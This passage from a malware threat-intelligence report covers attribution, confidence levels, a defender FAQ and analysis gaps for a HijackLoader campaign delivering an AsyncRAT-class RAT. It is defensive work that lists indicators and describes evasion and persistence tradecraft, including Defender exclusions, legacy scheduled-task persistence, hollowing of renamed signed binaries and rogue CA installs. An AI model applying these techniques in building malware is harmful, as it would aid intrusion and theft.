- HIGH confidence (90%) that the operator is Russian-speaking
- MODERATE confidence (75%) that this is a distinct operator (not coincidental shared bulletproof tenancy)
- LOW overall confidence (58%) that the distinct operator can be tracked as a single entity across the corpus
- INSUFFICIENT confidence for any link to a publicly named actor

The attribution-analyst's recommended language (`weak indicators suggest`) reflects the LOW confidence threshold per CLAUDE.md: at LOW (50–70%) confidence, the appropriate language is "weak indicators suggest" or "insufficient evidence for attribution," NOT "highly likely," "probable attribution to," or "possible attribution to."

### 11.2 Named actors ruled out

| Named actor | Confidence | Reason |
|---|---|---|
| **TAG-150 / GrayBravo** (Recorded Future) | INSUFFICIENT | Zero Castle-family components in any sample; zero infrastructure overlap with documented TAG-150 IPs. TAG-150 operators are specifically characterized by Castle-family components (CastleLoader, CastleBot, CastleRAT). |
| **TA544 / Narwhal Spider** (Proofpoint) | INSUFFICIENT | Final stage is AsyncRAT-class .NET RAT, not Remcos+SystemBC (TA544's documented downstream). Structural difference rules out. |

### 11.3 Russian-speaking operator language attribution (HIGH confidence — 90%)

Four independent Russian-language artifacts converge:

1. **`VSEZBSRABOTAT.url`** — Russian transliteration "vse zarabotat'" ("earn everything") in a `.url` filename. Operator-curated content, not auto-generated.
2. **`mozhno-li-vyvesti-dengi-s-krakena.html`** — Russian "can-you-withdraw-money-from-Kraken" historical URL on second-stage IP `109.120.137.6`.
3. **`busket/` Mega.io subdir typo** — operator misspelling of `bucket/`. Stable across all delivery vectors for 15+ months. Characteristic English-second-language tell.
4. **SPecialiST RePack YARA hit on `NDA.doc`** — `NDA.doc` was authored using the SPecialiST RePack Russian pirated Office authoring environment (per VT YARA match). This is an artifact of the operator's tooling, not lure content.

These signals are independent and converge. Operator language attribution holds at HIGH confidence (90%) even where actor-identity attribution is LOW.

### 11.4 Distinct-operator evidence (MODERATE — 75%)

Four cross-vector fingerprints collectively rule out the H4 alternative hypothesis (coincidental shared bulletproof tenancy of unrelated actors):

1. **`busket/` Mega.io subdir misspelling** stable across all 7 delivery vectors for 15+ months — operator-specific Russian-speaker ESL fingerprint.
2. **`I:\CompanySource\Plowshare\…\ExceptionHandler.pdb` PDB path** — organized multi-project build environment, project codename Plowshare; suggests dedicated developer workflow rather than commodity-only consumption.
3. **GoProxy MITM CA cert thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD`** — operator-specific tradecraft not in public HijackLoader reporting; represents an operator addition to the commodity loader chain.
4. **Per-host KDF: `X65599(GetComputerNameW()) XOR 0xa1b2d3b4`** as a structural pattern — resists 270+ cipher recovery attempts; above commodity level.

The four fingerprints together require a single operator. Coincidental shared BPH alone cannot explain the cross-vector consistency of the `busket/` typo across 15 months and seven delivery vectors.

### 11.5 Operator profile

**Role:** MaaS-customer + bundle-camouflage integrator + lure-developer (NOT custom-RAT developer; NOT loader developer).

**Evidence supporting the role:**
- The loader is commodity HijackLoader / Penguish / Rugmi (pe_03 is a 2023-07-10 build; matches Elastic GhostPulse YARA + Microsoft Rugmi labels exactly). Operator did not write the loader.
- The GoProxy installer (pe_06) is commodity Rugmi.HP. Operator did not write it.
- Operator's actual contribution is at the BUNDLE LAYER:
  - The 4-vendor camouflage layout (Crisp Squirrel + Info-ZIP + Google Updater + Qihoo 360)
  - The Inno Setup wrapper with Pascal Script `WinExec → return False` distribution stealth
  - The renamed-signed-vendor-binary hollow host pattern
  - The bundle-cleanup helper (pe_07, NOT on VT, campaign-unique)
  - The legacy `.job` + Defender exclusion persistence combo
  - The multi-vector phishing kit (8 parallel execution primitives)
  - The Russian-language lure infrastructure (VSEZBSRABOTAT, Kraken URL, `busket` typo)

**Sophistication assessment:** Advanced (selective). The operator demonstrates "selective sophistication" — high-tier work in chosen areas (multi-vendor camouflage, three-layer wrapping, cross-campaign-novel hollow-host pattern, per-host KDF) and commodity choices in others (Inno Setup near-stock wrapper, commodity HijackLoader loader, commodity Rugmi.HP cert installer). This is more diagnostic than uniform high-tier work — it tells you what the operator prioritized and what they consciously skipped.

**Operator codename lexicon (operator-curated identifiers):**
`Penguish` (loader family), `cytotoxin` (LDKPOIZD VT canonical filename), `Apophyge` (Inno AppName — architectural term for column-base curve), `Veteran` (Inno DefaultDirName), `Plowshare` (operator project from PDB), `brokerbg` / `adv_ctrl` / `exttracer_net48` / `thread_adapter` / `Sulfathiazole` (persistence directory codenames), `Bravo/vida` (NDA campaign codename), AppId GUID `{1F2952E4-FC07-4482-B9E6-E795507DA7D2}`, Mega.io operator-typo subdir `busket/`.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-apophyge-installer-config.png" | relative_url }}" alt="Plain-text dump of the Inno Setup [Setup] section embedded in Carriers.exe. The lines AppName=Apophyge and DefaultDirName=Veteran are highlighted in green. Other configuration values visible: AppId={{1F2952E4-FC07-4482-B9E6-E795507DA7D2}}, AppVersion=5.1, OutputBaseFilename=Carriers, Compression=lzma2, PrivilegesRequired=lowest, DisableDirPage=auto, DisableProgramGroupPage=auto, ChangesAssociations=no, ShowLanguageDialog=yes, WizardStyle=classic, WizardImageFile=embedded\\WizardImage0.png, WizardSmallImageFile=embedded\\WizardSmallImage0.png. Following the [Setup] block, [Files] entries list Source: '{tmp}\\BugSplat.dll' DestDir: '{tmp}' Flags: deleteafterinstall dontcopy, plus the same pattern for COMSupport.dll, CrystSupervisor32.exe, DBGHelp.dll, DVDSetting.dll, ExceptionHandler.dll.">
  <figcaption><em>Figure 15: Operator codenames embedded in the Inno Setup <code>[Setup]</code> section of <code>Carriers.exe</code>. <code>AppName=Apophyge</code> (an architectural term for the curve at the base of a column) and <code>DefaultDirName=Veteran</code> are operator-chosen labels — neither field needs to match the displayed software name and both surface the operator's distinctive vocabulary. The campaign-unique <code>AppId</code> GUID <code>{1F2952E4-FC07-4482-B9E6-E795507DA7D2}</code> persists in the registry post-install as a host-side hunt indicator.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-issrc-build-pdb-leak.png" | relative_url }}" alt="Ghidra string view of the Carriers.exe Pascal Script section showing a JSON-like structure with a 'file_paths' array containing entries for comctl32.dll, mpr.dll, netapi32.dll, netutils.dll, textshaping.dll, version.dll, winhttp.dll all loaded from %SystemRoot%\\system32. The bottom of the array, highlighted in green, shows the operator's local build path 'D:\\\\Coding\\\\Is\\\\issrc-build\\\\Components\\\\ChaCha20.pas', followed by '/DIR=\\\"x:\\\\dirname\\\"'.">
  <figcaption><em>Figure 16: Operator build-environment leak inside <code>Carriers.exe</code>. The Pascal Script source path <code>D:\Coding\Is\issrc-build\Components\ChaCha20.pas</code> reveals the operator builds Inno Setup wrappers locally from the Inno Setup source tree (<code>issrc-build</code>) on a dedicated <code>D:\Coding\</code> volume. Combined with the <code>I:\CompanySource\Plowshare\</code> PDB path in <code>ExceptionHandler.dll</code>, this paints the picture of an organized multi-volume developer workspace — not a one-off MaaS-customer build, and the strongest single piece of evidence supporting the "distinct organized operator" assessment for UTA-2026-007.</em></figcaption>
</figure>

**Distinctive style.** Uncommon English words mixed with technical-sounding codenames. **`Apophyge`** (architectural term for the curve at the base of a column) is a particularly diagnostic signal — suggests an eclectic-vocabulary wordlist generator or human author with unusual reading habits. This kind of distinctive vocabulary signature is the strongest non-technical attribution lead in the corpus, but it has not been linkable to any known named actor in public reporting.

### 11.6 Why higher confidence cannot yet be claimed

| Evidence type | Status |
|---|---|
| Government attribution statement | Absent |
| Code-similarity match to named-actor toolchain | Not completed |
| GoProxy cert thumbprint cross-investigation linkage | Not found in other Hunters Ledger investigations |
| Operator forum / dark-web identity | Not identified |
| Full sister-sample analysis on shared C2 | Not completed (5 sister samples on `185.241.208.129` not fully triaged) |

If any of these gaps closes — especially code-similarity to a named actor or government attribution — the LOW confidence (58%) could rise to MODERATE or HIGH and the UTA-2026-007 designation could be retired in favor of the named actor.

---

## 12. Confidence Summary

Findings are organized by confidence level for transparency.

### DEFINITE (Direct evidence, no ambiguity)

- **C2 endpoint:** TLSv1 to `185.241.208.129:56167` — Suricata flow + behavioral sandbox TCP log + netstat samples (PID 2596 `WVault.exe`)
- **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3`** — captured by Suricata; matches SSLBL AsyncRAT JA3 list
- **Spamhaus DROP listing** of AS210558 — Suricata rule 2400036 fired during the run
- **OFAC sanction** of AS210644 (AEZA GROUP LLC) — US Treasury SDN list, July 2025
- **Process tree:** `Carriers.exe → Carriers.tmp → CrystSupervisor32.exe (temp) → CrystSupervisor32.exe (persistent) → WVault.exe + Crisp.exe` — Sysmon EID 1
- **File hashes:** all artifact hashes in IOC feed (`opendirectory-62-60-237-100-20260506-iocs.json`) — captured directly
- **Inno Setup wrapper:** `AppName = Apophyge`, `DefaultDirName = Veteran`, `AppId = {1F2952E4-FC07-4482-B9E6-E795507DA7D2}` — read directly from Inno Setup header
- **PDB string:** `I:\CompanySource\Plowshare\Src\Symbol\Release\ExceptionHandler.pdb` — extracted directly from `ExceptionHandler.dll`
- **Multi-layer encoding format of `networkspec17.log`:** PNG-IDAT framing + 4-byte XOR with key `0xE1D5B4A2` (key visible at file offset 4–7) + LZNT1 chunked decompression — byte-confirmed
- **Defender exclusion** of `C:\ProgramData\adv_ctrl` — Sysmon EID 13 RegistrySetValue from `MsMpEng.exe`
- **Persistence:** legacy `.job` at `C:\Windows\Tasks\watchermgmt.job` + auto-migrated XML at `C:\Windows\System32\Tasks\watchermgmt`
- **No DNS resolution for C2** — 49 DNS queries during run, none point to operator-controlled C2 infrastructure (Sysmon EID 22)
- **SPecialiST RePack YARA hit** on `NDA.doc` — VT YARA match

### HIGH (Strong evidence, minor gaps)

- **Family identification: HijackLoader / Penguish / Rugmi / GhostPulse / IDAT Loader** — Kaspersky `Trojan.Win32.Penguish.gun`, Microsoft `TrojanDownloader:Win64/Rugmi.HNL!MTB`, Elastic `Windows_Trojan_GhostPulse_caea316b` YARA — three independent vendor classifications (~92% confidence)
- **Final-stage family is AsyncRAT-class .NET RAT** — three independent VT IDS hits on the SSL handshake (`AsyncRAT/zgRAT SSL cert`, `DCRat SSL cert`, `AsyncRAT JA3`) plus `clr.dll!CreateAssemblyNameObject` thread start address in `WVault.exe` — variant inconclusive (88% confidence)
- **Russian-speaking operator** — four independent first-language artifacts: `VSEZBSRABOTAT.url` filename, `mozhno-li-vyvesti-dengi-s-krakena.html` URL, `busket/` Mega.io subdir typo, SPecialiST RePack YARA hit (90% confidence)
- **`WVault.exe` is renamed Qihoo 360 PromoUtil.exe with .NET injection** — PDB path matches; build-time string matches; `clr.dll!CreateAssemblyNameObject` thread; orphaned process pattern (95% confidence)
- **Reflective loader `FUN_100024B0` in `ExceptionHandler.dll`** — PEB-walk API hash resolution + relocation step + memcpy + jump
- **Stage-2 shellcode 8-phase architecture** — API hash table at offsets `+0x14` through `+0x13c`; X65599 hash multiplier; anti-sandbox quadruple
- **pe_03 uses `ntdll!RtlHashUnicodeString` for API hash resolution** — under-documented TTP; algorithm byte-confirmed via PE Export Directory walk pattern
- **Multi-vendor camouflage bundle** — 4 genuine vendor binaries (Crisp Squirrel + Info-ZIP + Google Updater + Qihoo 360) co-located with 3 malicious operator-controlled PEs
- **Cross-campaign hollow-host TTP cluster** — 8+ campaigns since 2025 use the renamed-Qihoo-PromoUtil pattern (per VT execution_parents pivot)
- **`watchermgmt` scheduled task** — XML content directly read; `CalendarTrigger` 1-hour interval, daily recurrence
- **Pascal Script `InitializeSetup → WinExec → return False`** — bytecode decompiled via Inno Setup bytecode decompiler; behavioral pattern matches static prediction
- **GoProxy MITM CA cert install** — VT C2AE behavioral confirmation; technique IS in pe_06 even though not observed in 5-min behavioral sandbox window

### MODERATE (Reasonable evidence, notable gaps)

- **Per-host KDF structural pattern** (X65599 hostname-derived seed used as both PRNG seed and decryption key) — static reverse identified the structure; Round 13 dynamic data invalidated the exact byte-level algorithm (no FLARE-derived seed produces `EUOJCZYGOUCUG` in 1M-seed brute force)
- **Distinct operator (UTA-2026-007)** — 75% confidence; four cross-vector fingerprints (busket/, Plowshare PDB, GoProxy cert, per-host KDF) collectively support, but no public actor link
- **Operator role: MaaS-customer + bundle-camouflage integrator** — 78% confidence; based on commodity-loader use plus operator additions at the bundle layer
- **AS210558 recurrence as operator-overlap signal** — 70%; shared bulletproof tenancy is plausible alternative explanation

### LOW (Weak / circumstantial evidence)

- **UTA-2026-007 as a single trackable entity** — 58% confidence; no public actor link, no cross-investigation linkage of GoProxy cert thumbprint
- **Final-stage variant identification** (AsyncRAT vs DCRat vs zgRAT vs heavily modified) — cipher unrecovered after 270 attempts; runtime evidence required
- **Exfiltration over C2 channel (T1041)** — capability inferred from .NET RAT family characteristics; not directly observed in 5-min run

### INSUFFICIENT (Cannot assess from current data)

- **Specific RAT variant** — needs TLS MITM or memory dump
- **Government attribution** — none has been published for this operator
- **Cipher key derivation method** for `807D7B6.tmp` — runtime evidence required
- **Sister samples on AS210558** — `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` not yet analyzed for campaign-clustering linkage
- **Operator forum / dark-web identity** — not in public TI
- **TAG-150 / GrayBravo and TA544 / Narwhal Spider** — both ruled out at INSUFFICIENT confidence; the absence of Castle-family components rules out TAG-150; AsyncRAT-class final stage rules out TA544

---

## 13. FAQ / Key Intelligence Questions

This section answers the questions a defender, manager, or executive is most likely to ask after reading the report. Cross-references to the relevant section are included.

**Q1. Is my organization affected by this campaign?**
Check whether any host has connected to `185.241.208.129:56167` over TCP, or any process has produced a TLS ClientHello matching JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` (Section 6.7). Either signal is high-confidence evidence of infection. Hunt also for the persistence artifacts in Section 10.4 (the `watchermgmt` scheduled task in legacy `.job` format and the registry artifacts listed there) — these are durable and survive process restarts.

**Q2. What confidence level is the attribution?**
Three levels apply, with different confidence values (Section 11): the operator is Russian-speaking at HIGH confidence (90%); this is a distinct operator (not coincidental shared bulletproof tenancy) at MODERATE confidence (75%); the operator can be tracked as a single entity across the corpus at LOW confidence (58%). No link to any publicly named actor (TAG-150 / GrayBravo, TA544 / Narwhal Spider, etc.) has been established — both candidates were ruled out at INSUFFICIENT confidence.

**Q3. What is UTA-2026-007 and why does it matter?**
"UTA" stands for Unattributed Threat Actor. UTA-2026-007 is an internal Hunters Ledger tracking designation used because no link to a publicly named threat group could be established (Section 11.1 explanatory blockquote). It is specific to this publication — it will not appear in external threat intelligence feeds or vendor reports. If future evidence links this activity to a known named actor, the designation will be retired.

**Q4. What if my SOC sees the JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` on a live host?**
Treat this as a high-priority alert regardless of the specific campaign attribution. The JA3 fingerprint is on the Abuse.ch SSLBL list as an AsyncRAT-class indicator, and an active TLS handshake with this fingerprint indicates a .NET RAT actively beaconing from an infected host (Section 6.7). Verify the C2 destination IP and port, isolate the host from the network, and proceed with the artifacts in Section 10.4. If the destination IP/ASN matches `185.241.208.129` / AS210558, this is specifically UTA-2026-007. If the JA3 matches but the destination IP differs, the campaign is a different AsyncRAT-class operator — treat the alert as equally high-priority because the same RAT class is active.

**Q5. Will my DNS-based detection stack catch this campaign?**
No. The C2 IP `185.241.208.129` is hardcoded in the loader/payload and never queried via DNS (Section 6.8 — 49 DNS queries observed in the run, none point to operator infrastructure). DNS sinkholes, RPZ rules, and DGA-detection techniques will not catch this campaign. Detection must be IP-based, JA3-based, or behavioral.

**Q6. What is the time-to-detect window?**
~43 seconds from sample launch to first C2 beacon (Section 6.1 timing chain). File-based blocking (AV, gateway scan) must act within this window or behavioral detection at the orphan-`WVault.exe` stage is required. SIEM/EDR latency exceeding ~60 seconds is too slow for prevention; only detection-and-response is feasible at that latency.

**Q7. Why is the persistence so hard to find with autorunsc?**
The operator uses a legacy Windows scheduled-task format (`.job` file at `C:\Windows\Tasks\watchermgmt.job`) that Sysinternals autorunsc does not enumerate by default (Section 6.4.1). Within ~90 ms, Windows Task Scheduler service auto-migrates this to the modern XML format at `C:\Windows\System32\Tasks\watchermgmt`, but the `TaskCache` registry entry that autorunsc relies on may not be created. Hunt directly for `*.job` files in `C:\Windows\Tasks\` from non-system-installer parents, or enumerate `C:\Windows\System32\Tasks\` directly.

**Q8. Is this campaign linked to TAG-150 / GrayBravo or TA544 / Narwhal Spider?**
No. Both were ruled out at INSUFFICIENT confidence (Section 11.2). TAG-150 / GrayBravo is characterized by Castle-family components (CastleLoader, CastleBot, CastleRAT) — none are present in this corpus, and zero infrastructure overlap exists with documented TAG-150 IPs. TA544 / Narwhal Spider is documented as delivering Remcos+SystemBC; this campaign delivers an AsyncRAT-class .NET RAT. The structural difference in the final-stage family rules out TA544.

---

## 14. References to Companion Files

This report is published with two companion files containing machine-readable artifacts and detection rules. The deployed Jekyll URLs and the underlying raw filenames are listed below.

- **IOC feed (machine-readable JSON):**
  - Deployed URL: `/ioc-feeds/opendirectory-62-60-237-100-20260506-iocs/`
  - Raw filename: `opendirectory-62-60-237-100-20260506-iocs.json`
  - Contents: 147 validated IOCs (file hashes, IPs, domains, URLs, registry keys, file paths, named pipes, env-var patterns)
  - Use case: SIEM/EDR ingestion, gateway-AV hash-block lists, network perimeter IP/domain blocks
- **Detection rules (YARA, Sigma, Suricata):**
  - Deployed URL: `/hunting-detections/opendirectory-62-60-237-100-20260506-detections/`
  - Raw filename: `opendirectory-62-60-237-100-20260506-detections.md`
  - Contents: 6 YARA rules + 8 Sigma rules + 4 Suricata signatures (18 rules across three detection layers)
  - Use case: deploy YARA in endpoint memory scanners and gateway AV; Sigma in SIEM/EDR via siegma converters; Suricata in network IDS/IPS

Both files are licensed under Creative Commons Attribution-NonCommercial 4.0 (CC BY-NC 4.0). The IOC `iocs.json` feed is intended for direct ingestion by SIEM/EDR pipelines without further parsing; the detection `detections.md` file requires platform-specific deployment (siegma converters for Sigma, etc.).

---

## 15. Gaps & Assumptions

These gaps and assumptions do not block publication. The story is coherent: HIGH confidence on family attribution, DEFINITE on C2 endpoint, HIGH on the loader chain end-to-end, MODERATE on the per-host KDF pattern, INSUFFICIENT on the exact stealer variant. The cipher gap itself becomes a positive finding — operator's per-host KDF is more sophisticated than commodity AsyncRAT/DCRat patterns.

### 15.1 Outstanding analysis gaps

1. **Final-stealer cipher** — `807D7B6.tmp` cipher unrecovered after ~270 cryptographic combinations. Recovery requires interactive-debugger attach to `pe_03` mid-execution OR memory-dump of `WVault.exe` specifically.
2. **Final-stealer variant identification** — AsyncRAT vs DCRat vs zgRAT vs heavily modified variant. Cannot fix without TLS MITM on C2 or memory-dump of `WVault.exe`.
3. **GoProxy CA cert install was not directly observed in the 5-minute behavioral sandbox window** — VT C2AE confirms the technique; the analyst's run did not trigger it.
4. **`WVault.exe` drop hash divergence** — bundle hash `ca9f859f…` vs runtime drop `c085a724…`. Possible explanations include a slightly different version selected at runtime, operator post-extraction modification, or one hash misread. Confidence in the divergence is HIGH; confidence in the underlying cause is INSUFFICIENT.
5. **`pe_06` invocation mechanism** — process tree shows `Carriers.exe → Carriers.tmp → CrystSupervisor32.exe → ...` but does not show `pe_06`. The most likely explanation (per static analysis of the `_tiny_erase_` export pattern) is that `pe_06` is loaded as a DLL into one of the existing processes — confidence MODERATE.
6. **Sister samples on `185.241.208.129`** — `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` are sister samples; further triage could confirm campaign clustering and/or expand the UTA-2026-007 footprint.
7. **GoProxy cert thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD` cross-campaign linkage** — not yet found in other Hunters Ledger investigations; would be a high-value cross-campaign linkage if observed.

### 15.2 Working assumptions

The following assumptions underpin the analysis and are explicit so a future analyst can challenge them:

1. **C2 endpoint primacy** — we assume the C2 endpoint observed at investigation time (`185.241.208.129:56167`) is the operator's primary C2. We have not observed failover infrastructure or DGA-style C2 rotation, but cannot rule out that the operator has a backup C2 channel that was not triggered during the 5-minute behavioral sandbox window.
2. **Single-operator interpretation of cross-vector fingerprints** — we treat the four cross-vector fingerprints (`busket/` typo, Plowshare PDB, GoProxy cert thumbprint, per-host KDF) as evidence for a single operator at MODERATE confidence (75%). Coincidental shared bulletproof tenancy is the alternative hypothesis — evaluated and judged less plausible because the `busket/` typo is stable across all 7 vectors for 15+ months.
3. **Dynamic-static congruence on cipher gap** — we assume the static analysis of `pe_03`'s API resolution and KDF code path is broadly correct (HIGH confidence), and the dynamic invalidation of the env var algorithm at MODERATE confidence indicates a single missing element (rand-consume order, alphabet, RNG, hash function, OR seed source) rather than a fundamentally different algorithm. This assumption is testable with interactive debugger attach to a live `pe_03`.
4. **Final-stage family is AsyncRAT-class** — we assume the convergence of three independent VT IDS rule hits (AsyncRAT JA3, AsyncRAT/zgRAT SSL cert, DCRat C&C SSL cert) plus `clr.dll` thread evidence is sufficient to commit to the AsyncRAT-class designation at HIGH confidence (88%). Specific variant within the class (AsyncRAT vs DCRat vs zgRAT vs VenomRAT) is left INSUFFICIENT.
5. **Russian-speaking operator inference from artifact convergence** — we assume that four independent Russian-language artifacts (VSEZBSRABOTAT, Kraken URL, `busket` typo, SPecialiST RePack) constitute sufficient evidence for HIGH confidence (90%) on operator first language. This assumes the artifacts are not deliberate false-flag inserts; the cross-vector consistency and operator-curated nature of the artifacts make false-flag insertion implausible at the cost-benefit level for a commodity-malware operator.

---

© 2026 Joseph. All rights reserved. See LICENSE for terms.
